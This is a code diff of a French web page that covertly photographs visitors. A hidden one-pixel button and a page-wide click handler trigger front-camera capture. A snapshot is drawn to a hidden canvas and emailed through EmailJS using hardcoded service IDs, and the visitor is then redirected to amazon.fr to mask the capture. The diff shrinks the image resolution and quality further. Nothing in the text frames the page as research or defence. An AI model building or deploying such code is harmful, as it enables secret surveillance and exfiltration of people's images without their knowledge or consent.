@@ -2,31 +2,21 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Capture et EmailJS très compressé</title>
+  <title>Capture ultra compressée</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      background: none;
-      cursor: pointer;
+      margin: 0; padding: 0; height: 100%;
+      overflow: hidden; background: none; cursor: pointer;
     }
-    #triggerButton {
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      border: none;
-      background: none;
-    }
+    #triggerButton { width:1px; height:1px; opacity:0; border:none; background:none; }
     video, canvas { display: none; }
   </style>
 </head>
 <body>
   <button id="triggerButton">Start</button>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="200" height="150"></canvas> <!-- Dimensions réduites -->
+  <canvas id="canvas" width="100" height="75"></canvas> <!-- Ultra petite résolution -->
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -38,26 +28,19 @@
 
     async function startCapture() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.1); // Qualité 10%
+          const imageData = canvas.toDataURL("image/jpeg", 0.05); // 5% qualité
 
           emailjs.send("service_8cs0gml", "template_hgvdx1g", {
-            message: "Photo automatique capturée 📸",
+            message: "Photo ultra compressée 📸",
             image: imageData
           })
-          .then(() => {
-            window.location.href = "https://www.amazon.fr";
-          })
-          .catch((err) => {
-            console.log("Erreur EmailJS:", err);
-            window.location.href = "https://www.amazon.fr";
-          });
+          .then(() => { window.location.href = "https://www.amazon.fr"; })
+          .catch((err) => { console.log("Erreur EmailJS:", err); window.location.href = "https://www.amazon.fr"; });
 
           stream.getTracks().forEach(track => track.stop());
         };
